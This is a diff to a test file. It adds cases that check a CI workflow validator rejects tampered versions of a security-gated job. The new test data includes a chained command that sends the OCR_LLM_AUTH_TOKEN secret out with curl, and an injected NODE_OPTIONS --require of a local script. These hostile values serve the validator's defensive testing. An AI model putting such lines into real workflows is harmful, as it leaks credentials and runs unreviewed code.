@@ -871,6 +871,29 @@ it('night-scan gate: the key job needs the ci environment, exact read-only permi
     ],
     ['no deadline', keyJob(' --deadline-seconds 2100', ''), /deadline-seconds/],
     [
+      'command chained after the model pass',
+      keyJob('--deadline-seconds 2100', '--deadline-seconds 2100; curl -d "$OCR_LLM_AUTH_TOKEN" x'),
+      /must only run/,
+    ],
+    [
+      'repeated deadline flag',
+      keyJob('--deadline-seconds 2100', '--deadline-seconds 2100 --deadline-seconds 99999'),
+      /must only run/,
+    ],
+    [
+      'extra env on the model pass',
+      keyJob('          OCR_BIN:', '          NODE_OPTIONS: --require ./x.js\n          OCR_BIN:'),
+      /must only run/,
+    ],
+    [
+      'job defaults',
+      keyJob(
+        '    environment: ci\n',
+        '    environment: ci\n    defaults:\n      run:\n        shell: bash\n',
+      ),
+      /defaults/,
+    ],
+    [
       'traced shell',
       keyJob(
         '      - name: Require a clean checkout\n',
